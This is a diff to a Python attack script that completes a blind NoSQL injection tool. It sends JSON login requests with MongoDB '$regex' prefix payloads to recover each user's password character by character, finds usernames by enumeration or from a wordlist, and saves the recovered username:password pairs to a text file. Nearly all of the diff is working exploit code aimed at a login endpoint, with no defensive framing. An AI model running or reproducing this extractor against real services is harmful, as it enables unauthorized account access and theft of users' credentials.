@@ -18,11 +18,28 @@ user_and_password = {}
 
 chars_to_test = string.digits + string.ascii_letters
 
+
 def get_password(user, password):
-    pass
+    for c in chars_to_test:
+        print(c, end='')
+        sys.stdout.flush()
+        payload = {"user": user, "password": {"$regex": f"^{password}{c}"}, }
+        request = requests.post(url, json=payload)
+        if 'Invalid Password' not in request.text:
+            payload = {"user": user, "password": f"{password}{c}"}
+            request = requests.post(url, json=payload)
+            if 'Invalid Password' not in request.text:
+                return f"{password}{c}"
+            return get_password(user, f"{password}{c}")
+        print('\b', end='')
+    return 'Password not found'
+
 
 def get_passwords():
-    pass
+    for user in user_list:
+        user = str(user)
+        password = get_password(user, '')
+        user_and_password[user] = password
 
 
 def get_users(user):
@@ -40,6 +57,13 @@ def get_users(user):
         print('\b', end='')
 
 
+def dict_to_file():
+    f = open("users_passwords.txt", "a")
+    for element in user_and_password:
+        f.write(f"{element}:{user_and_password[element]}")
+    f.close()
+
+
 def wordlist_to_users(path_file):
     if not os.path.isfile(path_file):
         raise Exception(f'{path_file} Not Found!')
@@ -51,11 +75,14 @@ def wordlist_to_users(path_file):
 def main():
     if args['wordlist'] is not None:
         wordlist_to_users(args['wordlist'])
-        get_password()
+        get_passwords()
     else:
         get_users('')
         print(user_list)
-        get_password()
+        get_passwords()
+        print(user_and_password)
+    dict_to_file()
 
 
 main()
+
